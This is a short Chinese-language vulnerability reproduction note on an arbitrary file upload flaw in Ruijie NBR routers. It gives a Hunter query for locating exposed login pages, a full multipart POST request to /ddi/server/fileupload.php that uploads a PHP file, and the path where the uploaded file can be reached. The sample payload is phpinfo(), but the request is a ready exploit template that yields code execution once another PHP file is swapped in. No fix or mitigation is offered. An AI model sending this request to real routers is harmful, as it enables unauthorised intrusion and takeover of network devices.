# 锐捷NBR路由器fileupload.php任意文件上传漏洞

# 一、漏洞简介
锐捷NBR路由器是锐捷网络科技有限公司推出的一款高性能企业级路由器。NBR是"Next-Generation Broadband Router"的缩写，意为"下一代宽带路由器"。该路由器具有强大的处理能力和丰富的功能，适用于中小型企业、校园网络和数据中心等场景。锐捷 NBR 路由器 存在任意文件上传漏洞，可能导致执行恶意代码、服务器拒绝服务、数据泄露、网站篡改和横向渗透等危害。

# 二、影响版本
+ 锐捷NBR路由器

# 三、资产测绘
+ hunter`app.name=="Ruijie 锐捷 EWEB"`
+ 登录页面

![1693802366372-530b8f97-01f8-4fac-a782-d3306d3ea54e.png](./img/jFBa7SreAbBovuDn/1693802366372-530b8f97-01f8-4fac-a782-d3306d3ea54e-629998.png)

# 四、漏洞复现
```plain
POST /ddi/server/fileupload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 219

--00content0boundary00
Content-Disposition: form-data; name="uploadDir"

upload
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.php"

<?php phpinfo();?>
--00content0boundary00--

```

![1693802445069-749e8cd1-a5e8-4d46-8414-3f97cb5d244a.png](./img/jFBa7SreAbBovuDn/1693802445069-749e8cd1-a5e8-4d46-8414-3f97cb5d244a-776042.png)

上传文件位置

```plain
https://xx.xx.xx.xx/ddi/server/upload/1.php
```

![1693802535846-9a7f6ed5-7c93-4144-9561-7097e5d12ec5.png](./img/jFBa7SreAbBovuDn/1693802535846-9a7f6ed5-7c93-4144-9561-7097e5d12ec5-353619.png)



> 更新: 2024-06-24 11:42:26  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ydw1qor2zc4dv3k8>